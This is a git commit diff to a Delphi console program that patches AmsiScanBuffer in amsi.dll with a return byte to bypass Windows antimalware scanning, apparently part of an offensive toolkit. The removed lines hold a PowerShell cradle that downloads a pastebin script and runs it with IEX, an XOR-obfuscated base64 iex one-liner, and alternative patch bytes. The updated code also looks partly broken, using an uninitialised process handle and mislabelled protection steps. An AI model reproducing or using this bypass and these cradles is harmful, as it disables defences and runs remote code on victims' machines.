b422055f5b52195319ddae4e8be8edac5d0cba32
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-26 12:18:11 +0100

    fixed amsi WriteProcessMemory

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -1,104 +1,69 @@
-{http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)
-https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
-https://stackoverflow.com/questions/2229699/ok-to-use-virtualprotect-to-change-resource-in-delphi
-https://progamercity.net/delphi/789-snippet-write-bytes-memory.html
-https://blog.grijjy.com/2017/07/26/cross-platform-code-hooking/
-
-Protection list
-http://winapi.freetechsecrets.com/win32/WIN32VirtualProtect.htm
-}
-
-//x86-64 ret
-//0xC3
-
-
-//x86-64 mov
-//mov eax, 80070057h
-//ret
-//patch
-//0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
-
-
-//Function WriteIt(pAddress: Pointer; Bytes: Array of Byte): Boolean;
-//var
-//  OldProtect, DummyProtect: DWord;
-//begin
-//  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
-//   begin
-//    Move(Bytes, pAddress^, Length(Bytes));
-//    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @DummyProtect);
-//    Result := True
-//   end
-//   else
-//    Result := False;
-//end;
-
-
-
-// ScanBuffer Patch Tests
-// (new-object net.webclient).downloadstring('http://pastebin.com/raw.php?i=JHhnFV8m') | IEX
-
-//or
-
-// $base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="; $bytes = [Convert]::FromBase64String($base64); $string = -join ($bytes | % { [char] ($_ -bxor 0x33) }); iex $string
-
 program BasedAmsi_E;
+
 {$APPTYPE CONSOLE}
 
+{$R *.res}
+
+{
+https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
+https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
+https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
+}
+
 uses
-  SysUtils,
-  Windows,
-  Vcl.Forms;
+  System.SysUtils,
+  Windows
+  ;
 
 var
-  lib, kersee : THandle;
-  asb, kernbaseaddr : pointer;
-  OldProtect, DummyProtect : DWord;
-  retpatch : Array[0..0] of byte = ($C3);
+  PidHandle: integer;
+  PidID : integer;
+  Written: UIntPtr;
 
-function ByteToHex(InByte:byte):shortstring;
-const Digits:array[0..15] of char='0123456789ABCDEF';
-begin
- result:=digits[InByte shr 4]+digits[InByte and $0F];
-end;
+  lib : THandle;
+  asb : Pointer;
+  NumWrote : SIZE_T;
+  OldProtect : DWord;
+  garbage : Byte = $C3;
+
+type UIntPtr = NativeUInt;
+
+
 
 begin
   try
-    // Load amsi.dll , find AmsiScanBuffer
-    lib := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
+  //Init needed
+    //WriteLn(GetWindowThreadProcessId(h, PID));
+    //Proc := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, PID);
+    //WriteLn(Proc);
+
+
+
+
+
+  //Load and get base address for AmsScanBuffer
+    lib := LoadLibrary('amsi.dll');
     asb := GetProcAddress(lib,'AmsiScanBuffer');
-    WriteLn('Patching with : ',
-     ByteTohex(retpatch[0]),
-     #13#10,
-     'With len of : ',
-     SizeOf(retpatch)
-    );
+    WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
 
-    WriteLn(Format('amsi.dll base address: %p',[asb]));
 
-    //Set region to RWX
-    VirtualProtect(asb, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, asb);
+  //Change memory protection to RWX
+    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
+    WriteLn('[+] RWX protected');
 
-    //Copy Patch
-    //WriteIt(amsibaseaddr,(retpatch));
-    //Move(retpatch, amsibaseaddr, Length(retpatch));
 
-    //Restore region to RX
-    //VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READ, amsibaseaddr);
+  //Write to memory @ pter
+    WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
+    WriteLn('[+] Written To amsi.dll');
 
-  finally
-    FreeLibrary(lib);
+  //Change memory protection to RWX
+    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
+    WriteLn('[+] RX protected');
+
+
+  except
+    on E: Exception do
+      Writeln(E.ClassName, ': ', E.Message);
   end;
 end.
-
-
-  // Load amsi.dll , find AmsiScanBuffer
-    //amsee := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
-    //if amsee <> 0 then begin
-    //  amsibaseaddr := GetProcAddress(amsee,'AmsiScanBuffer');
-    //  WriteLn(Format('amsi.dll base address: %p',[amsibaseaddr]));
-    //end
-    //else begin
-    //WriteLn('Failed to load');
-    //end;
 
